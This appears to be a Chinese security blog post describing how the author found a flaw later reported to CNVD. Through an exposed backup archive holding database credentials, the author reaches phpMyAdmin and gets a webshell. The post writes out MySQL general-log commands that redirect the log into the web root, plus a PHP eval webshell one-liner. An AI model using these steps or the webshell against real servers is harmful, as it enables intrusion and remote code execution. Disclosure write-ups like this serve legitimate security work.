#  一次CNVD漏洞挖掘过程  
zzzurl  蓝云Sec   2025-06-18 16:01  
  
1、被测网站  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQUfSWEOz0etPWgPTZUFnKfDLdltU4d6UrWBYlq9OaVsQ0ib62SZg7Q3Q/640?wx_fmt=png&from=appmsg "")  
  
2、使用cmd命令查询该网站ip地址，  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQKjXLTTtmVEAAE5PnOBQKBOXQtNxMqhmvQ9icd3Pv288tMWULZGnAa9Q/640?wx_fmt=png&from=appmsg "")  
  
3、使用ip直接访问，改地址可直接下载文件（猜测应该是配置失误导致）  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQtCqSOqpNqWnTlKMEWibYwf3LdnqSX9O5uSeCibwYsMaWZCjLOgRVYppg/640?wx_fmt=png&from=appmsg "")  
  
4、发现该目录下有备份文件xxx.rar下载该文件  
  
5、找到文件中的敏感文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQFtFv6tJWIBcTqgPTkL9kGe1yYomc7tph01sib4t7BpEG0sHEnAV5oQA/640?wx_fmt=png&from=appmsg "")  
  
6、里面有数据库账号密码；  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQlAVoImuY2b6aucQj8xNJx5EIT8nLMdSsGP10Vc8J0PBmuYZ68RxvSw/640?wx_fmt=png&from=appmsg "")  
  
7、因为是php搭建有phpmyadmin使用phpmyadmin登陆  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQibXibM8WHMdnjJHLkzic2T1cuqYuunB6atk65uV8N8P7LerygyJ4gpQqA/640?wx_fmt=png&from=appmsg "")  
  
8、直接使用sql写入getshell  
  
9、通过写入日志文件getshell  
  
10、读写权限+web绝对路径，修改日志文件为webshell  
**具体利用方法如下:**  
  
(1) 开启日志记录:  
  
set global general_log = "ON";  
  
(2) 查看当前的日志目录:  
  
show variables like 'general%';  
  
(3) 指定日志文件(目录结构可以直接访问phpinfo)  
  
set global general_log_file = "C:/phpStudy/WWW/404.php";  
  
(4)写入执行代码：  
  
select "<?php $string=@$_POST['b'];eval('$string');?>";  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQvGiby6Ld2V90gYC2cWOBMB9Sibwm9GD9X1EvfBMOkDWXRIzHPMARib1jw/640?wx_fmt=png&from=appmsg "")  
  
最后getshell连接  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQ8FMuWvHFpyjZ5ib4CIPRKIgOOcuiaqyQq1FXLVJRhrlGAmnVE2ibic5ib6Q/640?wx_fmt=png&from=appmsg "")  
  
已上传到CNVD  
  
![](https://mmbiz.qpic.cn/mmbiz_png/IS2RlFMDPK7C9oVgOBoX4R1RE00tQDtQcsoahRKzYyTeeIPbKq66eicibWhxWMZnkpfSiaMVbyPsAabOVLNddzbnQ/640?wx_fmt=png&from=appmsg "")  
  
